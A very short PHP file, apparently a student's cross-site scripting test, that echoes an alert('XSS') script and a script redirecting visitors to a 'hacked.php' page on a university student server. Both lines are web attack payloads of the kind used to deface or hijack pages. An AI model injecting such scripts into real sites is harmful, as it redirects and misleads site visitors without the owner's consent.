<?php
echo '<script>alert("XSS")</script>';
echo "<script>window.location.href = 'https://studenter.miun.se/~fist2000/Mjukvaru/Projekt/hacked.php';</script>";

?>